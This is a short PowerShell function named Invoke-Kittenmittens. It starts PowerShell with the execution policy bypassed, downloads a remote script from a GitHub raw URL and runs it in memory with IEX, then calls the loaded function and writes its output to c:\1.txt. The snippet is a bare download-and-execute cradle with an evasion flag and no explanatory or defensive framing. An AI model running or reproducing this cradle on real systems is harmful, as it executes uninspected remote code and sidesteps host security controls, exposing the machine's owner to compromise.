function Invoke-Kittenmittens
{
	powershell -ep bypass -c IEX (new-object net.webclient).downloadstring('https://github.com/sirpsycho/Invoke-Kittenmittens/raw/master/Invoke-Kittenmittens.ps1');
	iNVOKE-kITTENMITTENS > c:\1.txt
}
